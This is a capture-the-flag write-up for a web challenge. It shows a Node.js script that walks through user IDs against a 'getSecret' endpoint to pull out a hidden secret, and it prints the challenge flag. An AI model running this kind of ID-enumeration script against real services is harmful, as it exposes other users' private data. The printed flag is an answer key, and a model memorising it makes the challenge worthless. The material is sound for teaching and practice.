# Request After Request

- Published: 04/27/2024 (#11/14 in round)
- Category: WebEx/Cryptography
- Points: 120
- Author: kshau

Secrets can sometimes be leaked...

## Attachments

- [https://csd.shaurya.pro/RequestAfterRequest](https://csd.shaurya.pro/RequestAfterRequest)

## Hint

This hint costed 10 points.

<details>
<summary>Reveal hint</summary>

Check the "Network" tab in dev browser tools and reload the page.

</details>

## Write-up

<details>
<summary>Reveal write-up</summary>

- Upon opening the website, visit the `Network` tab in dev browser tools and reload the page
- This should reveal a POST request being made to the `/RequestAfterRequest/getSecret` endpoint with the payload and response shown below

**Payload:**

```json
{"user": "354"}
```

**Response:**

```json
{"secret": "(blank)"}
```

- Use this same POST request to write a script that POST requests every user's secret (1,834 total users as shown on the site)
- The example shown below is a script written in NodeJS

```js
const {fetch} = require("undici");

async function getUserSecret(user) {
  
  const res = await fetch("https://csd.shaurya.pro/RequestAfterRequest/getSecret", {
    "headers": {
      "content-type": "application/json"
    },
    "body": JSON.stringify({"user": user}),
    "method": "POST"
  });

  const json = await res.json();

  const {secret} = json;
  return secret;
  
}

(async () => {

  for (var i = 0; i <= 1834; i++) {
    
    const secret = await getUserSecret(i.toString());

    console.log(`Checking secret of user ${i}`)

    if (secret != "(blank)") {
      console.log(secret);
      break;
    }
    
  }
  
})()
```

- The code should check every user's secret, and should output a long base64 string after checking the 1,372th user
- Go to [CyberChef](https://gchq.github.io/CyberChef)
- Input the base64 string in the `Input` field
- Next to the `Output` field label, click the magic wand icon
- This will reveal an image with the flag on it

Flag: `csd{NC1_15_510W1Y_8UrN1N6_M3_411V3}`

</details>

Write-up by kshau
